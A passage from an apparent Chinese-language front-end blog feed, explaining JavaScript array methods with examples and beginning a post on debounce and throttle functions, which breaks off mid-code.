<p>howmany如果设置为0，则不会删除项目。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.splice(<span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>));</span><br><span class="line"><span class="comment">// [3]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1, 2, 6, 4, 5]</span></span><br></pre></td></tr></table></figure></p>
<p>改变原始数组。</p>
<h2 id="toString-将数组转换为字符串"><a href="#toString-将数组转换为字符串" class="headerlink" title="toString()-将数组转换为字符串"></a>toString()-将数组转换为字符串</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.toString());</span><br><span class="line"><span class="comment">// 1,2,3</span></span><br></pre></td></tr></table></figure>
<p>返回值与没有参数的join()方法返回的字符串相同，元素之间用逗号分隔</p>
<h2 id="toLocaleString-把数组转换为本地字符串"><a href="#toLocaleString-把数组转换为本地字符串" class="headerlink" title="toLocaleString()-把数组转换为本地字符串"></a>toLocaleString()-把数组转换为本地字符串</h2><p>首先调用每个数组元素的toLocaleString()方法，然后使用地区特定的分隔符把生成的字符串连接起来，形成一个字符串。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.toLocaleString());</span><br><span class="line"><span class="comment">// a,b,c</span></span><br></pre></td></tr></table></figure></p>
<h2 id="valueOf-返回Array对象的原始值"><a href="#valueOf-返回Array对象的原始值" class="headerlink" title="valueOf()-返回Array对象的原始值"></a>valueOf()-返回Array对象的原始值</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.valueOf());</span><br><span class="line"><span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure>
<p>通常由JavaScript在后台自动调用，并不显式地出现在代码中。</p>
<h2 id="forEach-为每个元素调用一次函数"><a href="#forEach-为每个元素调用一次函数" class="headerlink" title="forEach()-为每个元素调用一次函数"></a>forEach()-为每个元素调用一次函数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">item, index, arr</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">  <span class="built_in">console</span>.log(index);</span><br><span class="line">  <span class="built_in">console</span>.log(arr);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// [1, 2]</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure>
<p>不改变原数组</p>
<h2 id="map-对每个元素执行函数来创建新数组"><a href="#map-对每个元素执行函数来创建新数组" class="headerlink" title="map()-对每个元素执行函数来创建新数组"></a>map()-对每个元素执行函数来创建新数组</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.map(<span class="function"><span class="keyword">function</span> (<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> item * <span class="number">2</span>;</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// [2, 4]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure>
<p>不改变原数组</p>
<h2 id="filter-通过测试的元素创建新数组"><a href="#filter-通过测试的元素创建新数组" class="headerlink" title="filter()-通过测试的元素创建新数组"></a>filter()-通过测试的元素创建新数组</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.filter(<span class="function"><span class="keyword">function</span> (<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> item &gt; <span class="number">1</span>;</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// [2]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure>
<p>不改变原数组</p>
<h2 id="reduce-每个元素运行函数，以生成（减少它）单个值。从左到右工作"><a href="#reduce-每个元素运行函数，以生成（减少它）单个值。从左到右工作" class="headerlink" title="reduce()-每个元素运行函数，以生成（减少它）单个值。从左到右工作"></a>reduce()-每个元素运行函数，以生成（减少它）单个值。从左到右工作</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">total, value, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> total + value;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(sum);</span><br><span class="line"><span class="comment">// 6</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>
<p>可以接受一个初始值<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">total, value, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> total + value;</span><br><span class="line">&#125;, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sum);</span><br><span class="line"><span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure></p>
<h2 id="reduceRight-每个元素运行函数，以生成（减少它）单个值。从右到左工作"><a href="#reduceRight-每个元素运行函数，以生成（减少它）单个值。从右到左工作" class="headerlink" title="reduceRight()-每个元素运行函数，以生成（减少它）单个值。从右到左工作"></a>reduceRight()-每个元素运行函数，以生成（减少它）单个值。从右到左工作</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduceRight(<span class="function"><span class="keyword">function</span> (<span class="params">total, value, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> total + value;</span><br><span class="line">&#125;, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sum);</span><br><span class="line"><span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>
<h2 id="every-检查所有数组值是否通过测试"><a href="#every-检查所有数组值是否通过测试" class="headerlink" title="every()-检查所有数组值是否通过测试"></a>every()-检查所有数组值是否通过测试</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.every(<span class="function"><span class="keyword">function</span> (<span class="params">value, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value &lt; <span class="number">3</span>;</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h2 id="some-检查某些数组值是否通过测试"><a href="#some-检查某些数组值是否通过测试" class="headerlink" title="some()-检查某些数组值是否通过测试"></a>some()-检查某些数组值是否通过测试</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.some(<span class="function"><span class="keyword">function</span> (<span class="params">value, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value &lt; <span class="number">3</span>;</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h2 id="indexOf-搜索元素值并返回其位置"><a href="#indexOf-搜索元素值并返回其位置" class="headerlink" title="indexOf()-搜索元素值并返回其位置"></a>indexOf()-搜索元素值并返回其位置</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">array.indexOf(item, start)</span><br></pre></td></tr></table></figure>
<p>item    必需。要检索的项目。<br>start    可选。从哪里开始搜索。负值将从结尾开始的给定位置开始，并搜索到结尾。</p>
<p>未找到项目返回-1。<br>项目多次出现，返回第一次出现的位置。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.indexOf(<span class="number">2</span>));</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
<h2 id="lastIndexOf-搜索元素值并返回其位置，从结尾开始搜索"><a href="#lastIndexOf-搜索元素值并返回其位置，从结尾开始搜索" class="headerlink" title="lastIndexOf()-搜索元素值并返回其位置，从结尾开始搜索"></a>lastIndexOf()-搜索元素值并返回其位置，从结尾开始搜索</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">array.lastIndexOf(item, start)</span><br></pre></td></tr></table></figure>
<p>item    必需。要检索的项目。<br>start    可选。从哪里开始搜索。负值将从结尾开始的给定位置开始，并搜索到开头。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.lastIndexOf(<span class="number">2</span>));</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
<h2 id="find-返回通过测试函数的第一个元素的值"><a href="#find-返回通过测试函数的第一个元素的值" class="headerlink" title="find()-返回通过测试函数的第一个元素的值"></a>find()-返回通过测试函数的第一个元素的值</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.find(<span class="function"><span class="keyword">function</span> (<span class="params">value, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">1</span>;</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h2 id="findIndex-返回通过测试函数的第一个元素的索引"><a href="#findIndex-返回通过测试函数的第一个元素的索引" class="headerlink" title="findIndex()-返回通过测试函数的第一个元素的索引"></a>findIndex()-返回通过测试函数的第一个元素的索引</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.findIndex(<span class="function"><span class="keyword">function</span> (<span class="params">value, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">1</span>;</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<h1 id="es6中的数组操作"><a href="#es6中的数组操作" class="headerlink" title="es6中的数组操作"></a>es6中的数组操作</h1><h2 id="Array-from-将类似数组的对象（array-like-object）和可遍历（iterable）的对象（包括ES6新增的数据结构Set和Map）转为真正的数组"><a href="#Array-from-将类似数组的对象（array-like-object）和可遍历（iterable）的对象（包括ES6新增的数据结构Set和Map）转为真正的数组" class="headerlink" title="Array.from()-将类似数组的对象（array-like object）和可遍历（iterable）的对象（包括ES6新增的数据结构Set和Map）转为真正的数组"></a>Array.from()-将类似数组的对象（array-like object）和可遍历（iterable）的对象（包括ES6新增的数据结构Set和Map）转为真正的数组</h2><p>所谓类似数组的对象，本质特征只有一点，即必须有length属性。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arrLike = &#123;</span><br><span class="line">  <span class="string">"0"</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">"1"</span>: <span class="number">2</span>,</span><br><span class="line">  length: <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ES5的写法</span></span><br><span class="line"><span class="built_in">console</span>.log([].slice.call(arrLike));</span><br><span class="line"><span class="comment">// [1, 2]</span></span><br><span class="line"><span class="comment">// ES6的写法</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.from(arrLike));</span><br><span class="line"><span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure></p>
<p>只要部署了Iterator接口的数据结构，Array.from都能将其转为数组，如Set和Map。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">set</span> = new Set([1, 2])</span><br><span class="line">console.log(Array.from(<span class="keyword">set</span>));</span><br><span class="line">// [1, 2]</span><br></pre></td></tr></table></figure></p>
<p>Array.from还可以接受第二个参数，作用类似于数组的map方法。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arrLike = &#123;</span><br><span class="line">  <span class="string">"0"</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">"1"</span>: <span class="number">2</span>,</span><br><span class="line">  length: <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.from(arrLike, value =&gt; value *<span class="number">2</span>));</span><br><span class="line"><span class="comment">// [2, 4]</span></span><br></pre></td></tr></table></figure></p>
<p>如果map函数里面用到了this关键字，还可以传入Array.from的第三个参数，用来绑定this。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arrLike = &#123;</span><br><span class="line">  <span class="string">"0"</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">"1"</span>: <span class="number">2</span>,</span><br><span class="line">  length: <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> context = &#123;</span><br><span class="line">  key: <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.from(arrLike, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>.key *<span class="number">2</span> &#125;, context));</span><br><span class="line"><span class="comment">// [2, 2]</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Array-of-将一组值转换为数组"><a href="#Array-of-将一组值转换为数组" class="headerlink" title="Array.of()-将一组值转换为数组"></a>Array.of()-将一组值转换为数组</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.of(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line"><span class="comment">// [1, 2]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.of(<span class="number">2</span>));</span><br><span class="line"><span class="comment">// [2]</span></span><br></pre></td></tr></table></figure>
<p>参数个数不同，不会有像new Array()一样行为有差异。</p>
<p>Array.of()的模拟实现<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ArrayOf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Array-prototype-copyWithin-在当前数组内部，将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组。"><a href="#Array-prototype-copyWithin-在当前数组内部，将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组。" class="headerlink" title="Array.prototype.copyWithin()-在当前数组内部，将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组。"></a>Array.prototype.copyWithin()-在当前数组内部，将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组。</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.copyWithin(target, start = <span class="number">0</span>, end = <span class="keyword">this</span>.length)</span><br></pre></td></tr></table></figure>
<ol>
<li>target（必需）：从该位置开始替换数据。如果为负值，表示倒数。</li>
<li>start（可选）：从该位置开始读取数据，默认为 0。如果为负值，表示从末尾开始计算。</li>
<li>end（可选）：到该位置前停止读取数据，默认等于数组长度。如果为负值，表示从末尾开始计算。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.copyWithin(<span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line"><span class="comment">// [4, 5, 3, 4, 5]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [4, 5, 3, 4, 5]</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="Array-prototype-fill-使用给定值，填充一个数组"><a href="#Array-prototype-fill-使用给定值，填充一个数组" class="headerlink" title="Array.prototype.fill()-使用给定值，填充一个数组"></a>Array.prototype.fill()-使用给定值，填充一个数组</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr.fill(value, start, end);</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].fill(<span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line"><span class="comment">// [1, 4, 3]</span></span><br></pre></td></tr></table></figure>
<h2 id="Array-prototype的entries-、keys-和values"><a href="#Array-prototype的entries-、keys-和values" class="headerlink" title="Array.prototype的entries()、keys()和values()"></a>Array.prototype的entries()、keys()和values()</h2><p>keys()是对键名的遍历、values()是对键值的遍历，entries()是对键值对的遍历。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">of</span> [<span class="number">1</span>, <span class="number">2</span>].keys()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> [<span class="number">1</span>, <span class="number">2</span>].values()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [index, value] <span class="keyword">of</span> [<span class="number">1</span>, <span class="number">2</span>].entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index, value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0 1</span></span><br><span class="line"><span class="comment">// 1 2</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Array-prototype-includes-表示数组是否包含给定的值，与字符串的includes方法类似。"><a href="#Array-prototype-includes-表示数组是否包含给定的值，与字符串的includes方法类似。" class="headerlink" title="Array.prototype.includes()-表示数组是否包含给定的值，与字符串的includes方法类似。"></a>Array.prototype.includes()-表示数组是否包含给定的值，与字符串的includes方法类似。</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.includes(value, start);</span><br></pre></td></tr></table></figure>
<p>该方法的第二个参数表示搜索的起始位置。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">3</span>));</span><br><span class="line"><span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">-1</span>));</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<p>includes不会导致对NaN的误判</p>
<h2 id="Array-prototype-flat-将嵌套的数组“拉平”"><a href="#Array-prototype-flat-将嵌套的数组“拉平”" class="headerlink" title="Array.prototype.flat()-将嵌套的数组“拉平”"></a>Array.prototype.flat()-将嵌套的数组“拉平”</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>]].flat());</span><br><span class="line"><span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]].flat(<span class="number">1</span>));</span><br><span class="line"><span class="comment">// [1, 2, 3, Array(2)]</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]].flat(<span class="number">2</span>));</span><br><span class="line"><span class="comment">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure>
<p>flat()的参数代表“拉平”几层的嵌套数组，使用Infinity关键字，不管多少层嵌套，都可以转成一维数组。</p>
<h2 id="Array-prototype-flatMap-对原数组的每个成员执行一个函数，对返回值组成的数组执行flat-方法"><a href="#Array-prototype-flatMap-对原数组的每个成员执行一个函数，对返回值组成的数组执行flat-方法" class="headerlink" title="Array.prototype.flatMap()-对原数组的每个成员执行一个函数，对返回值组成的数组执行flat()方法"></a>Array.prototype.flatMap()-对原数组的每个成员执行一个函数，对返回值组成的数组执行flat()方法</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr.flatMap(<span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">currentValue, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;, thisArg)</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].flatMap(<span class="function">(<span class="params">x</span>) =&gt;</span> [x, x * <span class="number">2</span>]));</span><br><span class="line"><span class="comment">// [2, 4, 3, 6, 4, 8]</span></span><br></pre></td></tr></table></figure>
<p>只能展开一层数组。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].flatMap(<span class="function"><span class="params">x</span> =&gt;</span> [[x * <span class="number">2</span>]]));</span><br><span class="line"><span class="comment">// [[2], [4], [6], [8]]</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>防抖和节流</title>
    <url>/2019/10/25/%E9%98%B2%E6%8A%96%E5%92%8C%E8%8A%82%E6%B5%81/</url>
    <content><![CDATA[<p>防抖和节流<br><a id="more"></a></p>
<h1 id="防抖（debounce）"><a href="#防抖（debounce）" class="headerlink" title="防抖（debounce）"></a>防抖（debounce）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>事件被触发经过单位时间(delay)后再执行回调，如果在单位时间内又被触发，则重新计时。</p>
<h2 id="防抖函数"><a href="#防抖函数" class="headerlink" title="防抖函数"></a>防抖函数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> debounce = <span class="function">(<span class="params">cb, delay = <span class="number">1000</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (timer) clearTimeout(timer);</span><br><span class="line">    timer = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      cb.apply(context, args);</span><br><span class="line">      timer = <span class="literal">null</span>;</span><br><span class="line">    &#125;, delay);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若延迟delay设置为1000(默认值)，则cb(回调函数)只会在停止触发1s后执行，如果一直不断地触发，则回调函数始终不执行。</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>下面是一个简单的使用示例，后续介绍的防抖和节流函数的使用方式也是相似的。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> callback = <span class="function"><span class="params">()</span> =&gt;</span> &#123;      </span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">Math</span>.random());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> handle = debounce(callback, <span class="number">1000</span>);</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, handle);</span><br></pre></td></tr></table></figure></p>
<h2 id="防抖函数-第一次触发会立即执行"><a href="#防抖函数-第一次触发会立即执行" class="headerlink" title="防抖函数(第一次触发会立即执行)"></a>防抖函数(第一次触发会立即执行)</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> debounceImmediate = <span class="function">(<span class="params">cb, delay = <span class="number">1000</span>, immediate = <span class="literal">true</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">const</span> execNow = immediate &amp;&amp; !timer;</span><br><span class="line">    <span class="keyword">if</span> (timer) clearTimeout(timer);</span><br><span class="line">    timer = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      cb.apply(context, args);</span><br><span class="line">      timer = <span class="literal">null</span>;</span><br><span class="line">    &#125;, delay);</span><br><span class="line">    execNow &amp;&amp; cb.apply(<span class="keyword">this</span>, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当设置immediate=true(默认值)、delay=1000(默认值)时，第一次触发会立即执行回调函数。后续执行和普通的防抖函数一样，只有在停止触发1s后回调函数才会执行，如果还是一直不断地触发，则回调函数始终不执行。</p>
<h1 id="节流（throttle）"><a href="#节流（throttle）" class="headerlink" title="节流（throttle）"></a>节流（throttle）</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>规定在单位时间(delay)内，只能触发一次函数。如果单位时间内多次触发函数，只会执行一次回调。</p>
<h2 id="节流函数-使用时间戳"><a href="#节流函数-使用时间戳" class="headerlink" title="节流函数(使用时间戳)"></a>节流函数(使用时间戳)</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> throttleUseTimeStamp = <span class="function">(<span class="params">cb, delay = <span class="number">1000</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> startTime = <span class="built_in">Date</span>.now();  </span><br><span class="line">　<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;      </span><br><span class="line">　　<span class="keyword">const</span> context = <span class="keyword">this</span>;                        </span><br><span class="line">　　<span class="keyword">const</span> now = <span class="built_in">Date</span>.now();           </span><br><span class="line">　　<span class="keyword">if</span> (now - startTime &gt;= delay) &#123;</span><br><span class="line">      cb.apply(context, args);</span><br><span class="line">      startTime = <span class="built_in">Date</span>.now();        </span><br><span class="line">　　&#125;</span><br><span class="line">　&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若delay=1000，则在1s内只会执行一次回调函数。</p>
<h2 id="节流函数的实现-使用定时器"><a href="#节流函数的实现-使用定时器" class="headerlink" title="节流函数的实现(使用定时器)"></a>节流函数的实现(使用定时器)</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> throttleUseTimer = <span class="function">(<span class="params">cb, delay</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (!timer) &#123;</span><br><span class="line">      timer = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        cb.apply(context, args);      </span><br><span class="line">        timer = <span class="literal">null</span>;      </span><br><span class="line">      &#125;, delay);  </span><br><span class="line">    &#125; </span><br><span class="line">  